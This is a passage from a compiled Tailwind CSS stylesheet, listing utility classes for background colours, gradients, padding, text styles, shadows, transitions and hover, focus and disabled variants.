            --tw-bg-opacity: 1;
            background-color: rgb(238 244 252/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F3F6FB\] {
            --tw-bg-opacity: 1;
            background-color: rgb(243 246 251/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F5F5F5\] {
            --tw-bg-opacity: 1;
            background-color: rgb(245 245 245/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F6FFF9\] {
            --tw-bg-opacity: 1;
            background-color: rgb(246 255 249/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F7A633\] {
            --tw-bg-opacity: 1;
            background-color: rgb(247 166 51/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F7F8FA\] {
            --tw-bg-opacity: 1;
            background-color: rgb(247 248 250/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F8F8F8\] {
            --tw-bg-opacity: 1;
            background-color: rgb(248 248 248/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F9F9F9\] {
            --tw-bg-opacity: 1;
            background-color: rgb(249 249 249/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FAFAFA\] {
            --tw-bg-opacity: 1;
            background-color: rgb(250 250 250/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FBC229\] {
            --tw-bg-opacity: 1;
            background-color: rgb(251 194 41/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FDE3E4\] {
            --tw-bg-opacity: 1;
            background-color: rgb(253 227 228/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FFF5F3\] {
            --tw-bg-opacity: 1;
            background-color: rgb(255 245 243/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FFF8EC\] {
            --tw-bg-opacity: 1;
            background-color: rgb(255 248 236/var(--tw-bg-opacity, 1))
        }

        .bg-black {
            --tw-bg-opacity: 1;
            background-color: rgb(0 0 0/var(--tw-bg-opacity, 1))
        }

        .bg-blue-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(219 234 254/var(--tw-bg-opacity, 1))
        }

        .bg-bw-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .bg-bw-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(207 207 207/var(--tw-bg-opacity, 1))
        }

        .bg-bw-300 {
            --tw-bg-opacity: 1;
            background-color: rgb(182 182 182/var(--tw-bg-opacity, 1))
        }

        .bg-bw-400 {
            --tw-bg-opacity: 1;
            background-color: rgb(158 158 158/var(--tw-bg-opacity, 1))
        }

        .bg-bw-500 {
            --tw-bg-opacity: 1;
            background-color: rgb(134 134 134/var(--tw-bg-opacity, 1))
        }

        .bg-bw-900 {
            --tw-bg-opacity: 1;
            background-color: rgb(37 37 37/var(--tw-bg-opacity, 1))
        }

        .bg-danger-main {
            --tw-bg-opacity: 1;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1))
        }

        .bg-gray-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(243 244 246/var(--tw-bg-opacity, 1))
        }

        .bg-gray-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(229 231 235/var(--tw-bg-opacity, 1))
        }

        .bg-gray-400 {
            --tw-bg-opacity: 1;
            background-color: rgb(156 163 175/var(--tw-bg-opacity, 1))
        }

        .bg-primary {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .bg-primary-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1))
        }

        .bg-primary-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(204 222 238/var(--tw-bg-opacity, 1))
        }

        .bg-primary-focus {
            --tw-bg-opacity: 1;
            background-color: rgb(77 139 196/var(--tw-bg-opacity, 1))
        }

        .bg-secondary-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(254 238 212/var(--tw-bg-opacity, 1))
        }

        .bg-secondary-900 {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .bg-slate-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(226 232 240/var(--tw-bg-opacity, 1))
        }

        .bg-slate-50 {
            --tw-bg-opacity: 1;
            background-color: rgb(248 250 252/var(--tw-bg-opacity, 1))
        }

        .bg-success-main {
            --tw-bg-opacity: 1;
            background-color: rgb(29 153 120/var(--tw-bg-opacity, 1))
        }

        .bg-transparent {
            background-color: initial
        }

        .bg-warning-surface {
            --tw-bg-opacity: 1;
            background-color: rgb(253 228 194/var(--tw-bg-opacity, 1))
        }

        .bg-white {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .bg-opacity-25 {
            --tw-bg-opacity: .25
        }

        .bg-opacity-50 {
            --tw-bg-opacity: .5
        }

        .bg-opacity-90 {
            --tw-bg-opacity: .9
        }

        .bg-gradient-to-l {
            background-image: linear-gradient(to left, var(--tw-gradient-stops))
        }

        .bg-gradient-to-r {
            background-image: linear-gradient(to right, var(--tw-gradient-stops))
        }

        .bg-gradient-to-t {
            background-image: linear-gradient(to top, var(--tw-gradient-stops))
        }

        .\!from-danger-main {
            --tw-gradient-from: #ec213d var(--tw-gradient-from-position) !important;
            --tw-gradient-to: #ec213d00 var(--tw-gradient-to-position) !important;
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to) !important
        }

        .from-\[\$\{themeData\.bg_color\}\] {
            --tw-gradient-from:$ {
                themeData.bg color
            }

            var(--tw-gradient-from-position);
            --tw-gradient-to:#fff0 var(--tw-gradient-to-position);
            --tw-gradient-stops:var(--tw-gradient-from),
            var(--tw-gradient-to)
        }

        .from-primary {
            --tw-gradient-from: #005aab var(--tw-gradient-from-position);
            --tw-gradient-to: #005aab00 var(--tw-gradient-to-position);
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to)
        }

        .from-white {
            --tw-gradient-from: #fff var(--tw-gradient-from-position);
            --tw-gradient-to: #fff0 var(--tw-gradient-to-position);
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to)
        }

        .from-50\% {
            --tw-gradient-from-position: 50%
        }

        .\!to-danger-main {
            --tw-gradient-to: #ec213d var(--tw-gradient-to-position) !important
        }

        .to-\[\#E6EFF6\] {
            --tw-gradient-to: #e6eff6 var(--tw-gradient-to-position)
        }

        .to-bw-500 {
            --tw-gradient-to: #868686 var(--tw-gradient-to-position)
        }

        .to-bw-800 {
            --tw-gradient-to: #3d3d3d var(--tw-gradient-to-position)
        }

        .to-bw-900 {
            --tw-gradient-to: #252525 var(--tw-gradient-to-position)
        }

        .to-transparent {
            --tw-gradient-to: #0000 var(--tw-gradient-to-position)
        }

        .to-50\% {
            --tw-gradient-to-position: 50%
        }

        .bg-cover {
            background-size: cover
        }

        .bg-center {
            background-position: 50%
        }

        .fill-primary {
            fill: #005aab
        }

        .object-contain {
            object-fit: contain
        }

        .object-cover {
            object-fit: cover
        }

        .object-center {
            object-position: center
        }

        .\!p-0 {
            padding: 0 !important
        }

        .p-0 {
            padding: 0
        }

        .p-1 {
            padding: .25rem
        }

        .p-2 {
            padding: .5rem
        }

        .p-3 {
            padding: .75rem
        }

        .p-4 {
            padding: 1rem
        }

        .p-5 {
            padding: 1.25rem
        }

        .p-6 {
            padding: 1.5rem
        }

        .p-8 {
            padding: 2rem
        }

        .p-\[1px\] {
            padding: 1px
        }

        .\!px-0 {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        .\!px-12 {
            padding-left: 3rem !important;
            padding-right: 3rem !important
        }

        .\!px-14 {
            padding-left: 3.5rem !important;
            padding-right: 3.5rem !important
        }

        .\!px-16 {
            padding-left: 4rem !important;
            padding-right: 4rem !important
        }

        .\!px-2 {
            padding-left: .5rem !important;
            padding-right: .5rem !important
        }

        .\!px-3 {
            padding-left: .75rem !important;
            padding-right: .75rem !important
        }

        .\!px-4 {
            padding-left: 1rem !important;
            padding-right: 1rem !important
        }

        .\!px-6 {
            padding-left: 1.5rem !important;
            padding-right: 1.5rem !important
        }

        .\!py-2 {
            padding-bottom: .5rem !important;
            padding-top: .5rem !important
        }

        .px-0 {
            padding-left: 0;
            padding-right: 0
        }

        .px-1 {
            padding-left: .25rem;
            padding-right: .25rem
        }

        .px-2 {
            padding-left: .5rem;
            padding-right: .5rem
        }

        .px-3 {
            padding-left: .75rem;
            padding-right: .75rem
        }

        .px-4 {
            padding-left: 1rem;
            padding-right: 1rem
        }

        .px-5 {
            padding-left: 1.25rem;
            padding-right: 1.25rem
        }

        .px-6 {
            padding-left: 1.5rem;
            padding-right: 1.5rem
        }

        .px-8 {
            padding-left: 2rem;
            padding-right: 2rem
        }

        .py-1 {
            padding-bottom: .25rem;
            padding-top: .25rem
        }

        .py-10 {
            padding-bottom: 2.5rem;
            padding-top: 2.5rem
        }

        .py-12 {
            padding-bottom: 3rem;
            padding-top: 3rem
        }

        .py-16 {
            padding-bottom: 4rem;
            padding-top: 4rem
        }

        .py-2 {
            padding-bottom: .5rem;
            padding-top: .5rem
        }

        .py-20 {
            padding-bottom: 5rem;
            padding-top: 5rem
        }

        .py-3 {
            padding-bottom: .75rem;
            padding-top: .75rem
        }

        .py-4 {
            padding-bottom: 1rem;
            padding-top: 1rem
        }

        .py-5 {
            padding-bottom: 1.25rem;
            padding-top: 1.25rem
        }

        .py-6 {
            padding-bottom: 1.5rem;
            padding-top: 1.5rem
        }

        .py-7 {
            padding-bottom: 1.75rem;
            padding-top: 1.75rem
        }

        .py-8 {
            padding-bottom: 2rem;
            padding-top: 2rem
        }

        .py-9 {
            padding-bottom: 2.25rem;
            padding-top: 2.25rem
        }

        .py-\[10px\] {
            padding-bottom: 10px;
            padding-top: 10px
        }

        .py-\[11px\] {
            padding-bottom: 11px;
            padding-top: 11px
        }

        .\!pl-10 {
            padding-left: 2.5rem !important
        }

        .\!pl-12 {
            padding-left: 3rem !important
        }

        .\!pl-16 {
            padding-left: 4rem !important
        }

        .\!pl-8 {
            padding-left: 2rem !important
        }

        .\!pl-\[3\.5rem\] {
            padding-left: 3.5rem !important
        }

        .pb-1 {
            padding-bottom: .25rem
        }

        .pb-12 {
            padding-bottom: 3rem
        }

        .pb-16 {
            padding-bottom: 4rem
        }

        .pb-2 {
            padding-bottom: .5rem
        }

        .pb-3 {
            padding-bottom: .75rem
        }

        .pb-4 {
            padding-bottom: 1rem
        }

        .pb-5 {
            padding-bottom: 1.25rem
        }

        .pb-6 {
            padding-bottom: 1.5rem
        }

        .pb-8 {
            padding-bottom: 2rem
        }

        .pb-\[450px\] {
            padding-bottom: 450px
        }

        .pb-\[env\(safe-area-inset-bottom\)\] {
            padding-bottom: env(safe-area-inset-bottom)
        }

        .pl-1 {
            padding-left: .25rem
        }

        .pl-2 {
            padding-left: .5rem
        }

        .pl-3 {
            padding-left: .75rem
        }

        .pl-4 {
            padding-left: 1rem
        }

        .pl-5 {
            padding-left: 1.25rem
        }

        .pl-8 {
            padding-left: 2rem
        }

        .pl-\[2px\] {
            padding-left: 2px
        }

        .pr-1 {
            padding-right: .25rem
        }

        .pr-12 {
            padding-right: 3rem
        }

        .pr-2 {
            padding-right: .5rem
        }

        .pr-3 {
            padding-right: .75rem
        }

        .pr-4 {
            padding-right: 1rem
        }

        .pr-8 {
            padding-right: 2rem
        }

        .pr-\[10px\] {
            padding-right: 10px
        }

        .pt-0 {
            padding-top: 0
        }

        .pt-1 {
            padding-top: .25rem
        }

        .pt-10 {
            padding-top: 2.5rem
        }

        .pt-12 {
            padding-top: 3rem
        }

        .pt-16 {
            padding-top: 4rem
        }

        .pt-2 {
            padding-top: .5rem
        }

        .pt-28 {
            padding-top: 7rem
        }

        .pt-3 {
            padding-top: .75rem
        }

        .pt-4 {
            padding-top: 1rem
        }

        .pt-5 {
            padding-top: 1.25rem
        }

        .pt-6 {
            padding-top: 1.5rem
        }

        .pt-8 {
            padding-top: 2rem
        }

        .pt-\[2px\] {
            padding-top: 2px
        }

        .text-left {
            text-align: left
        }

        .text-center {
            text-align: center
        }

        .text-right {
            text-align: right
        }

        .font-sans {
            font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji
        }

        .\!text-base {
            font-size: 1rem !important;
            line-height: 1.5rem !important
        }

        .\!text-sm {
            font-size: .875rem !important;
            line-height: 1.25rem !important
        }

        .\!text-xs {
            font-size: .75rem !important;
            line-height: 1rem !important
        }

        .text-2xl {
            font-size: 1.5rem;
            line-height: 2rem
        }

        .text-3xl {
            font-size: 1.875rem;
            line-height: 2.25rem
        }

        .text-4xl {
            font-size: 2.25rem;
            line-height: 2.5rem
        }

        .text-5xl {
            font-size: 3rem;
            line-height: 1
        }

        .text-\[10px\] {
            font-size: 10px
        }

        .text-\[12px\] {
            font-size: 12px
        }

        .text-\[16px\] {
            font-size: 16px
        }

        .text-\[40px\] {
            font-size: 40px
        }

        .text-\[8px\] {
            font-size: 8px
        }

        .text-\[9px\] {
            font-size: 9px
        }

        .text-base {
            font-size: 1rem;
            line-height: 1.5rem
        }

        .text-lg {
            font-size: 1.125rem;
            line-height: 1.75rem
        }

        .text-sm {
            font-size: .875rem;
            line-height: 1.25rem
        }

        .text-xl {
            font-size: 1.25rem;
            line-height: 1.75rem
        }

        .text-xs {
            font-size: .75rem;
            line-height: 1rem
        }

        .\!font-normal {
            font-weight: 400 !important
        }

        .font-bold {
            font-weight: 700
        }

        .font-light {
            font-weight: 300
        }

        .font-medium {
            font-weight: 500
        }

        .font-normal {
            font-weight: 400
        }

        .font-semibold {
            font-weight: 600
        }

        .capitalize {
            text-transform: capitalize
        }

        .italic {
            font-style: italic
        }

        .leading-tight {
            line-height: 1.25
        }

        .\!text-bw-500 {
            --tw-text-opacity: 1 !important;
            color: rgb(134 134 134/var(--tw-text-opacity, 1)) !important
        }

        .\!text-danger-main {
            --tw-text-opacity: 1 !important;
            color: rgb(236 33 61/var(--tw-text-opacity, 1)) !important
        }

        .\!text-primary {
            --tw-text-opacity: 1 !important;
            color: rgb(0 90 171/var(--tw-text-opacity, 1)) !important
        }

        .\!text-success-main {
            --tw-text-opacity: 1 !important;
            color: rgb(29 153 120/var(--tw-text-opacity, 1)) !important
        }

        .text-\[\#00000073\] {
            color: #00000073
        }

        .text-\[\#161616\] {
            --tw-text-opacity: 1;
            color: rgb(22 22 22/var(--tw-text-opacity, 1))
        }

        .text-\[\#1890FF\] {
            --tw-text-opacity: 1;
            color: rgb(24 144 255/var(--tw-text-opacity, 1))
        }

        .text-\[\#27303A\] {
            --tw-text-opacity: 1;
            color: rgb(39 48 58/var(--tw-text-opacity, 1))
        }

        .text-\[\#353535\] {
            --tw-text-opacity: 1;
            color: rgb(53 53 53/var(--tw-text-opacity, 1))
        }

        .text-\[\#4C4C4C\] {
            --tw-text-opacity: 1;
            color: rgb(76 76 76/var(--tw-text-opacity, 1))
        }

        .text-\[\#646464\] {
            --tw-text-opacity: 1;
            color: rgb(100 100 100/var(--tw-text-opacity, 1))
        }

        .text-\[\#797979\] {
            --tw-text-opacity: 1;
            color: rgb(121 121 121/var(--tw-text-opacity, 1))
        }

        .text-\[\#868686\] {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .text-\[\#898989\] {
            --tw-text-opacity: 1;
            color: rgb(137 137 137/var(--tw-text-opacity, 1))
        }

        .text-\[\#CA2D33\] {
            --tw-text-opacity: 1;
            color: rgb(202 45 51/var(--tw-text-opacity, 1))
        }

        .text-\[\#DA001A\] {
            --tw-text-opacity: 1;
            color: rgb(218 0 26/var(--tw-text-opacity, 1))
        }

        .text-\[\#E0E0E7\] {
            --tw-text-opacity: 1;
            color: rgb(224 224 231/var(--tw-text-opacity, 1))
        }

        .text-\[\#FF9F00\] {
            --tw-text-opacity: 1;
            color: rgb(255 159 0/var(--tw-text-opacity, 1))
        }

        .text-blue-400 {
            --tw-text-opacity: 1;
            color: rgb(96 165 250/var(--tw-text-opacity, 1))
        }

        .text-bw-200 {
            --tw-text-opacity: 1;
            color: rgb(207 207 207/var(--tw-text-opacity, 1))
        }

        .text-bw-300 {
            --tw-text-opacity: 1;
            color: rgb(182 182 182/var(--tw-text-opacity, 1))
        }

        .text-bw-400 {
            --tw-text-opacity: 1;
            color: rgb(158 158 158/var(--tw-text-opacity, 1))
        }

        .text-bw-500 {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .text-bw-600 {
            --tw-text-opacity: 1;
            color: rgb(110 110 110/var(--tw-text-opacity, 1))
        }

        .text-bw-700 {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .text-bw-800 {
            --tw-text-opacity: 1;
            color: rgb(61 61 61/var(--tw-text-opacity, 1))
        }

        .text-bw-900 {
            --tw-text-opacity: 1;
            color: rgb(37 37 37/var(--tw-text-opacity, 1))
        }

        .text-danger-main {
            --tw-text-opacity: 1;
            color: rgb(236 33 61/var(--tw-text-opacity, 1))
        }

        .text-gray-200 {
            --tw-text-opacity: 1;
            color: rgb(229 231 235/var(--tw-text-opacity, 1))
        }

        .text-gray-500 {
            --tw-text-opacity: 1;
            color: rgb(107 114 128/var(--tw-text-opacity, 1))
        }

        .text-gray-600 {
            --tw-text-opacity: 1;
            color: rgb(75 85 99/var(--tw-text-opacity, 1))
        }

        .text-gray-700 {
            --tw-text-opacity: 1;
            color: rgb(55 65 81/var(--tw-text-opacity, 1))
        }

        .text-gray-900 {
            --tw-text-opacity: 1;
            color: rgb(17 24 39/var(--tw-text-opacity, 1))
        }

        .text-primary {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .text-red-500 {
            --tw-text-opacity: 1;
            color: rgb(239 68 68/var(--tw-text-opacity, 1))
        }

        .text-success-main {
            --tw-text-opacity: 1;
            color: rgb(29 153 120/var(--tw-text-opacity, 1))
        }

        .text-warning-main {
            --tw-text-opacity: 1;
            color: rgb(247 166 51/var(--tw-text-opacity, 1))
        }

        .text-white {
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .underline {
            text-decoration-line: underline
        }

        .line-through {
            text-decoration-line: line-through
        }

        .opacity-0 {
            opacity: 0
        }

        .opacity-40 {
            opacity: .4
        }

        .shadow {
            --tw-shadow: 0 1px 3px 0 #0000001a, 0 1px 2px -1px #0000001a;
            --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color)
        }

        .shadow,
        .shadow-lg {
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .shadow-lg {
            --tw-shadow: 0 10px 15px -3px #0000001a, 0 4px 6px -4px #0000001a;
            --tw-shadow-colored: 0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color)
        }

        .shadow-md {
            --tw-shadow: 0 4px 6px -1px #0000001a, 0 2px 4px -2px #0000001a;
            --tw-shadow-colored: 0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .outline {
            outline-style: solid
        }

        .ring-1 {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .ring-primary {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(0 90 171/var(--tw-ring-opacity, 1))
        }

        .\!ring-offset-4 {
            --tw-ring-offset-width: 4px !important
        }

        .blur {
            --tw-blur: blur(8px)
        }

        .blur,
        .brightness-50 {
            filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .brightness-50 {
            --tw-brightness: brightness(.5)
        }

        .grayscale {
            --tw-grayscale: grayscale(100%)
        }

        .filter,
        .grayscale {
            filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .transition {
            transition-duration: .25s;
            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-\[grid-template-rows\] {
            transition-duration: .25s;
            transition-property: grid-template-rows;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-\[padding-top\] {
            transition-duration: .25s;
            transition-property: padding-top;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-\[scale\] {
            transition-duration: .25s;
            transition-property: scale;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-all {
            transition-duration: .25s;
            transition-property: all;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .duration-1000 {
            transition-duration: 1s
        }

        .duration-300 {
            transition-duration: .3s
        }

        .duration-500 {
            transition-duration: .5s
        }

        .ease-in {
            transition-timing-function: cubic-bezier(.4, 0, 1, 1)
        }

        .ease-in-out {
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        @media (min-width:768px) {
            .md\:container {
                width: 100%
            }

            @media (min-width:640px) {
                .md\:container {
                    max-width: 640px
                }
            }

            .md\:container {
                max-width: 768px
            }

            @media (min-width:1024px) {
                .md\:container {
                    max-width: 1024px
                }
            }

            @media (min-width:1280px) {
                .md\:container {
                    max-width: 1280px
                }
            }

            @media (min-width:1440px) {
                .md\:container {
                    max-width: 1440px
                }
            }

            @media (min-width:1920px) {
                .md\:container {
                    max-width: 1920px
                }
            }
        }

        @media (min-width:1920px) {
            .\33xl\:container {
                width: 100%
            }

            @media (min-width:640px) {
                .\33xl\:container {
                    max-width: 640px
                }
            }

            @media (min-width:768px) {
                .\33xl\:container {
                    max-width: 768px
                }
            }

            @media (min-width:1024px) {
                .\33xl\:container {
                    max-width: 1024px
                }
            }

            @media (min-width:1280px) {
                .\33xl\:container {
                    max-width: 1280px
                }
            }

            @media (min-width:1440px) {
                .\33xl\:container {
                    max-width: 1440px
                }
            }

            .\33xl\:container {
                max-width: 1920px
            }
        }

        .\*\:aspect-square>* {
            aspect-ratio: 1/1
        }

        .\*\:\!size-10>* {
            height: 2.5rem !important;
            width: 2.5rem !important
        }

        .\*\:\!size-5>* {
            height: 1.25rem !important;
            width: 1.25rem !important
        }

        .\*\:size-24>* {
            height: 6rem;
            width: 6rem
        }

        .\*\:h-full>* {
            height: 100%
        }

        .\*\:\!w-auto>* {
            width: auto !important
        }

        .\*\:w-full>* {
            width: 100%
        }

        .\*\:\!max-w-2xl>* {
            max-width: 42rem !important
        }

        .\*\:\!max-w-3xl>* {
            max-width: 48rem !important
        }

        .\*\:\!max-w-5xl>* {
            max-width: 64rem !important
        }

        .\*\:max-w-3xl>* {
            max-width: 48rem
        }

        .\*\:max-w-4xl>* {
            max-width: 56rem
        }

        .\*\:max-w-5xl>* {
            max-width: 64rem
        }

        .\*\:max-w-full>* {
            max-width: 100%
        }

        .\*\:max-w-lg>* {
            max-width: 32rem
        }

        .\*\:max-w-md>* {
            max-width: 28rem
        }

        .\*\:max-w-sm>* {
            max-width: 24rem
        }

        .\*\:max-w-xl>* {
            max-width: 36rem
        }

        .\*\:flex-1>* {
            flex: 1 1 0%
        }

        .\*\:flex-wrap>* {
            flex-wrap: wrap
        }

        .\*\:\!gap-2>* {
            gap: .5rem !important
        }

        .\*\:gap-0>* {
            gap: 0
        }

        .\*\:\*\:text-nowrap>*>* {
            text-wrap: nowrap
        }

        .\*\:\!border-none>* {
            border-style: none !important
        }

        .\*\:\!bg-danger-main>* {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1)) !important
        }

        .\*\:\!bg-success-main>* {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(29 153 120/var(--tw-bg-opacity, 1)) !important
        }

        .\*\:\!bg-transparent>* {
            background-color: initial !important
        }

        .\*\:\!bg-warning-main>* {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(247 166 51/var(--tw-bg-opacity, 1)) !important
        }

        .\*\:\!p-0>* {
            padding: 0 !important
        }

        .\*\:p-0>* {
            padding: 0
        }

        .\*\:\!px-0>* {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        .\*\:px-3>* {
            padding-left: .75rem;
            padding-right: .75rem
        }

        .\*\:text-center>* {
            text-align: center
        }

        .\*\:\!text-danger-main>* {
            --tw-text-opacity: 1 !important;
            color: rgb(236 33 61/var(--tw-text-opacity, 1)) !important
        }

        .\*\:\!shadow-none>* {
            --tw-shadow: 0 0 #0000 !important;
            --tw-shadow-colored: 0 0 #0000 !important;
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow) !important
        }

        .placeholder\:\!text-blue-400::placeholder {
            --tw-text-opacity: 1 !important;
            color: rgb(96 165 250/var(--tw-text-opacity, 1)) !important
        }

        .placeholder\:text-bw-500::placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .after\:absolute:after {
            content: var(--tw-content);
            position: absolute
        }

        .after\:start-\[2px\]:after {
            content: var(--tw-content);
            inset-inline-start: 2px
        }

        .after\:top-0\.5:after {
            content: var(--tw-content);
            top: .125rem
        }

        .after\:h-4:after {
            content: var(--tw-content);
            height: 1rem
        }

        .after\:w-4:after {
            content: var(--tw-content);
            width: 1rem
        }

        .after\:rounded-full:after {
            border-radius: 9999px;
            content: var(--tw-content)
        }

        .after\:border:after {
            border-width: 1px;
            content: var(--tw-content)
        }

        .after\:border-gray-300:after {
            content: var(--tw-content);
            --tw-border-opacity: 1;
            border-color: rgb(209 213 219/var(--tw-border-opacity, 1))
        }

        .after\:bg-white:after {
            content: var(--tw-content);
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .after\:transition-all:after {
            content: var(--tw-content);
            transition-duration: .25s;
            transition-property: all;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .after\:content-\[\'\'\]:after {
            --tw-content: "";
            content: var(--tw-content)
        }

        .last\:border-none:last-child {
            border-style: none
        }

        .odd\:bg-\[\#F8F8F8\]:nth-child(odd) {
            --tw-bg-opacity: 1;
            background-color: rgb(248 248 248/var(--tw-bg-opacity, 1))
        }

        .even\:bg-\[\#F9F9F9\]:nth-child(2n) {
            --tw-bg-opacity: 1;
            background-color: rgb(249 249 249/var(--tw-bg-opacity, 1))
        }

        .checked\:\!bg-primary:checked {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .checked\:bg-primary:checked {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .hover\:\!bg-primary:hover {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .hover\:\!bg-white:hover {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1)) !important
        }

        .hover\:bg-blue-100:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(219 234 254/var(--tw-bg-opacity, 1))
        }

        .hover\:bg-primary-100:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1))
        }

        .hover\:bg-slate-50:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(248 250 252/var(--tw-bg-opacity, 1))
        }

        .hover\:bg-opacity-50:hover {
            --tw-bg-opacity: .5
        }

        .hover\:font-bold:hover {
            font-weight: 700
        }

        .hover\:\!text-primary:hover {
            --tw-text-opacity: 1 !important;
            color: rgb(0 90 171/var(--tw-text-opacity, 1)) !important
        }

        .hover\:text-primary:hover {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .hover\:underline:hover {
            text-decoration-line: underline
        }

        .hover\:opacity-80:hover {
            opacity: .8
        }

        .hover\:grayscale-\[50\%\]:hover {
            --tw-grayscale: grayscale(50%);
            filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .focus\:border-primary:focus {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1))
        }

        .focus\:border-transparent:focus {
            border-color: #0000
        }

        .focus\:ring-0:focus {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .active\:opacity-50:active {
            opacity: .5
        }

        .disabled\:cursor-not-allowed:disabled {
            cursor: not-allowed
        }

        .disabled\:border-transparent:disabled {
            border-color: #0000
        }

        .disabled\:\!bg-gray-200:disabled {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(229 231 235/var(--tw-bg-opacity, 1)) !important
